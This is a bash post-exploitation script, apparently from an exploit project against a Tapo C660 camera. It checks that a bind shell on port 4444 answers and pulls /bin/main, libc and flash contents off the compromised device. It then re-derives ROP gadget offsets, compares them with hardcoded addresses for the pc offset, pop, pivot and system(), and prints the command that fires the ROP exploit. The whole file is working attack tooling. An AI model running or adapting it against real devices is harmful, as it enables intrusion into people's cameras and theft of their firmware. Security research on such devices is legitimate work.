#!/bin/bash
# Post-shell step for the C660: verify the shell, pull, re-derive, compare, and only then
# emit a ROP line.
#
# The offline chain in docs/exploit/tapo-c660-gadgets.md §8 is derived from the *image on
# disk*. The unit runs whatever build it runs, so the pulled /bin/main is compared against the
# offline baseline field by field; a mismatch prints both sides and refuses to print a line
# rather than firing last week's addresses.
#
#   deliverables/scripts/c660_post_shell.sh 192.168.4.71
#
# Exit: 0 match (ROP line printed) · 1 no shell · 2 pull incomplete · 3 mismatch
set -u
HOST="${1:-192.168.4.71}"
OUT="${OUT:-/tmp/pane1/$HOST}"
WAIT="${WAIT:-60}"
HERE="$(cd "$(dirname "$0")" && pwd)"
POST="${POST:-$HERE/tapo_post.py}"
FINDER="${FINDER:-$HERE/../../tools/tapo_oracle/find_chain.py}"
NC_CMD="${NC_CMD:-nc}"

# offline baseline (image build in ~/fss-exploit/c660_fw.bin.dec)
WANT_PC=1060           # 0x424
WANT_POP=0x24462
WANT_PIVOT=0x28514e
WANT_SYSTEM=0x15928

say() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*"; }

# 1. the only real success signal is the bind shell answering
say "waiting up to ${WAIT}s for the shell on $HOST:4444"
ok=0
for _ in $(seq 1 "$WAIT"); do
  if $NC_CMD -z -G2 "$HOST" 4444 >/dev/null 2>&1; then ok=1; break; fi
  sleep 1
done
[ "$ok" = 1 ] || { say "no shell on $HOST:4444"; exit 1; }
say "shell answers"

# 2. recon + pull (writes $OUT/recon.txt and flattened copies)
say "pulling (mtd, /bin/main, libc)"
python3 "$POST" "$HOST" --pull
MAIN=""
for cand in "$OUT/bin_main" "$OUT/bin/main" "/tmp/pane1/$HOST/bin_main"; do
  [ -s "$cand" ] && { MAIN="$cand"; break; }
done
[ -n "$MAIN" ] || { say "no /bin/main pulled into $OUT"; exit 2; }
say "pulled $MAIN ($(wc -c <"$MAIN") bytes)"

# 3. re-derive and compare
res=$(python3 "$FINDER" "$MAIN" --json 2>/dev/null)
got_pc=$(python3 -c 'import json,sys;d=json.load(sys.stdin);print((d.get("sink") or {}).get("pc_offset",""))' <<<"$res" 2>/dev/null)
got_pop=$(python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("pop") or "")' <<<"$res" 2>/dev/null)
got_pivot=$(python3 -c 'import json,sys;d=json.load(sys.stdin);print((d.get("pivot") or {}).get("addr",""))' <<<"$res" 2>/dev/null)
got_system=$(python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("system") or "")' <<<"$res" 2>/dev/null)

say "pulled : pc=$got_pc pop=$got_pop pivot=$got_pivot system=$got_system"
say "offline: pc=$WANT_PC pop=$WANT_POP pivot=$WANT_PIVOT system=$WANT_SYSTEM"
for pair in "pc:$got_pc:$WANT_PC" "pop:$got_pop:$WANT_POP" \
            "pivot:$got_pivot:$WANT_PIVOT" "system:$got_system:$WANT_SYSTEM"; do
  n=${pair%%:*}; rest=${pair#*:}; g=${rest%%:*}; w=${rest#*:}
  # the JSON carries plain ints; the shell baseline is hex for the gadgets, decimal for pc
  if [ "$n" = pc ]; then
    gd=$((g)); wd=$((w))
  else
    gd=$((g)); wd=$((w))
  fi
  if [ "$gd" = "$wd" ]; then continue; fi
  if [ "$n" = pc ]; then gp=$gd; wp=$wd
  else gp=$(printf '0x%x' "$gd"); wp=$(printf '0x%x' "$wd"); fi
  say "MISMATCH $n: pulled $gp vs offline $wp — re-derive before firing"
  exit 3
done

say "match — the offline chain applies to this build"
echo
printf 'python3 %s %s --offset %s --pop %s --pivot %s --system %s\n' \
  "$HERE/tapo_connectap_rop.py" "$HOST" "$WANT_PC" "$WANT_POP" "$WANT_PIVOT" "$WANT_SYSTEM"
